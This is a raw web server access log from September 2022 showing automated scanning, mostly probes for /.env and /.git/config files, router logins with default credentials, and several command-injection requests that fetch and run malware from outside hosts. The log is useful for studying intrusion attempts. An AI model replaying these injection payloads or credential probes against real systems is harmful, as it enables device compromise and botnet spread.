135.125.244.48 - - [09/Sep/2022:13:30:10 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:13:30:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.140.248.32 - - [09/Sep/2022:13:33:29 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
162.221.192.26 - - [09/Sep/2022:13:38:01 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
106.75.25.168 - - [09/Sep/2022:14:35:12 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
135.125.244.48 - - [09/Sep/2022:15:03:58 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:15:03:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [09/Sep/2022:15:04:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [09/Sep/2022:15:04:11 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
106.75.241.23 - - [09/Sep/2022:15:05:49 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.241.23 - - [09/Sep/2022:15:05:51 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:15:27:24 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:15:27:24 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [09/Sep/2022:16:09:01 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [09/Sep/2022:16:09:02 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.198.144.118 - - [09/Sep/2022:17:16:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "python-requests/2.25.1"
135.125.244.48 - - [09/Sep/2022:17:44:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:17:44:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [09/Sep/2022:18:16:02 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [09/Sep/2022:18:16:04 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:18:25:35 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:18:25:35 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.30 - - [09/Sep/2022:18:49:31 +0000] "GET http://example.com/ HTTP/1.1" 200 32 "-" "Go-http-client/1.1"
172.105.77.209 - - [09/Sep/2022:19:00:00 +0000] "-" 408 - "-" "-"
95.214.235.205 - - [09/Sep/2022:19:25:28 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [09/Sep/2022:19:25:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.92.32.175 - - [09/Sep/2022:19:46:52 +0000] "GET / HTTP/1.1" 200 32 "-" "<title>(.*?)</title>"
135.125.244.48 - - [09/Sep/2022:20:02:38 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:20:02:38 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
175.107.1.252 - - [09/Sep/2022:20:21:50 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 196 "-" "-"
135.125.244.48 - - [09/Sep/2022:21:05:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:21:05:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.184.87.208 - - [09/Sep/2022:21:19:45 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
104.152.52.194 - - [09/Sep/2022:21:30:27 +0000] "GET / HTTP/1.0" 200 32 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
135.125.244.48 - - [09/Sep/2022:22:33:25 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:22:33:25 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [09/Sep/2022:22:42:24 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [09/Sep/2022:22:42:24 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:22:48:25 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:22:48:26 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
182.127.180.134 - - [09/Sep/2022:23:05:12 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 196 "-" "-"
117.185.79.6 - - [10/Sep/2022:00:12:45 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
95.9.72.112 - - [10/Sep/2022:00:17:12 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
2.58.56.92 - - [10/Sep/2022:00:29:59 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.58.56.92 - - [10/Sep/2022:00:30:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.75.208.253 - - [10/Sep/2022:00:33:11 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
18.216.3.117 - - [10/Sep/2022:00:41:03 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C)"
205.210.31.11 - - [10/Sep/2022:01:14:58 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.244.48 - - [10/Sep/2022:01:16:46 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:01:16:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.210 - - [10/Sep/2022:02:14:50 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:02:33:30 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:02:33:31 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.43.16.97 - - [10/Sep/2022:02:58:21 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
54.235.229.109 - - [10/Sep/2022:03:51:43 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/60.0.3080.103 Safari/537.32"
92.118.39.30 - - [10/Sep/2022:04:04:49 +0000] "GET http://example.com/ HTTP/1.1" 200 32 "-" "Go-http-client/1.1"
135.125.244.48 - - [10/Sep/2022:04:27:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:04:27:40 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.129 - - [10/Sep/2022:04:44:40 +0000] "\x16\x03\x01" 400 226 "-" "-"
135.125.244.48 - - [10/Sep/2022:05:23:32 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:05:23:32 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:06:01:57 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:06:01:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.219.22 - - [10/Sep/2022:06:08:15 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
89.165.5.249 - - [10/Sep/2022:06:19:24 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.170.253.105 - - [10/Sep/2022:06:59:29 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 91.218.67.190/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4" 400 226 "-" "-"
135.125.217.54 - - [10/Sep/2022:08:14:47 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:08:14:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.62.191.231 - - [10/Sep/2022:08:39:21 +0000] "GET / HTTP/1.1" 200 32 "-" "curl/7.64.1"
209.141.36.112 - - [10/Sep/2022:08:39:35 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.112 - - [10/Sep/2022:08:39:35 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
113.137.32.112 - - [10/Sep/2022:08:48:35 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
113.137.32.112 - - [10/Sep/2022:08:48:35 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:08:56:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:08:56:28 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.83.21.18 - - [10/Sep/2022:08:58:10 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
128.14.134.170 - - [10/Sep/2022:09:50:01 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
113.118.192.145 - - [10/Sep/2022:09:52:42 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 196 "-" "-"
36.82.128.193 - - [10/Sep/2022:10:07:56 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:10:18:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:10:19:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
161.35.213.88 - - [10/Sep/2022:11:00:56 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
161.35.213.88 - - [10/Sep/2022:11:00:57 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
106.124.153.78 - - [10/Sep/2022:11:32:54 +0000] "POST /HNAP1/ HTTP/1.0" 400 226 "-" "-"
65.49.20.68 - - [10/Sep/2022:12:18:38 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
65.49.20.100 - - [10/Sep/2022:12:22:20 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83"
135.125.217.54 - - [10/Sep/2022:12:45:12 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:12:45:13 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.194 - - [10/Sep/2022:13:14:40 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
34.77.127.183 - - [10/Sep/2022:13:21:48 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
135.125.217.54 - - [10/Sep/2022:13:25:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:13:25:55 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
219.79.84.17 - - [10/Sep/2022:13:40:16 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
185.142.236.41 - - [10/Sep/2022:13:54:48 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.41 - - [10/Sep/2022:13:54:48 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "-"
185.142.236.41 - - [10/Sep/2022:13:54:49 +0000] "GET /sitemap.xml HTTP/1.1" 404 196 "-" "-"
185.142.236.41 - - [10/Sep/2022:13:54:50 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 196 "-" "-"
185.142.236.41 - - [10/Sep/2022:13:54:51 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
94.102.61.10 - - [10/Sep/2022:13:55:14 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
34.78.6.216 - - [10/Sep/2022:13:59:04 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
54.226.208.101 - - [10/Sep/2022:14:30:48 +0000] "GET /.env HTTP/1.1" 404 196 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
54.226.208.101 - - [10/Sep/2022:14:30:48 +0000] "POST / HTTP/1.1" 200 32 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
135.125.217.54 - - [10/Sep/2022:14:37:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:14:37:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:15:52:10 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:15:52:11 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
114.132.186.122 - - [10/Sep/2022:17:00:26 +0000] "CONNECT pv.sohu.com:443 HTTP/1.1" 405 224 "-" "Java/1.8.0_342"
114.132.186.122 - - [10/Sep/2022:17:00:28 +0000] "GET http://pv.sohu.com/cityjson HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:17:03:01 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:17:03:02 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
79.127.67.241 - - [10/Sep/2022:18:03:17 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:19:00:48 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:19:00:49 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.26 - - [10/Sep/2022:19:13:52 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.217.54 - - [10/Sep/2022:20:23:04 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:20:23:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.46 - - [10/Sep/2022:20:32:38 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.46 - - [10/Sep/2022:20:32:49 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
205.210.31.174 - - [10/Sep/2022:21:27:04 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.217.54 - - [10/Sep/2022:21:34:27 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:21:34:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.178.120.159 - - [10/Sep/2022:21:36:17 +0000] "GET / HTTP/1.1" 200 32 "http://54.199.218.165:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
45.83.65.3 - - [10/Sep/2022:22:02:59 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.64.116 - - [10/Sep/2022:22:02:59 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
135.125.217.54 - - [10/Sep/2022:22:45:27 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:22:45:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.114.76 - - [10/Sep/2022:22:53:11 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
201.249.162.230 - - [10/Sep/2022:23:02:04 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:23:34:46 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [10/Sep/2022:23:34:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.13 - - [10/Sep/2022:23:40:27 +0000] "\x16\x03\x01" 400 226 "-" "-"
192.241.220.72 - - [11/Sep/2022:00:13:07 +0000] "GET /portal/redlion HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
119.246.243.45 - - [11/Sep/2022:00:20:27 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
192.34.56.97 - - [11/Sep/2022:00:21:48 +0000] "GET / HTTP/1.1" 200 32 "http://54.199.218.165:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
185.40.192.36 - - [11/Sep/2022:00:25:20 +0000] "HEAD / HTTP/1.1" 200 - "-" "python-requests/2.27.1"
135.125.217.54 - - [11/Sep/2022:01:41:57 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
